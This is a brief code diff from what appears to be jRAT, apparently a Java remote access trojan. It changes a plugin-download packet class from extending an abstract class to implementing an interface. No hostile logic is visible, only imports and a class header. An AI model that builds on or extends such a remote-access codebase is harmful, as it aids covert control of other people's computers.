@@ -4,7 +4,7 @@ import jrat.client.Connection;
 import jrat.common.io.FileCache;
 import jrat.common.io.TransferData;
 
-public class Packet106ClientDownloadPlugin extends AbstractIncomingPacket {
+public class Packet106ClientDownloadPlugin implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
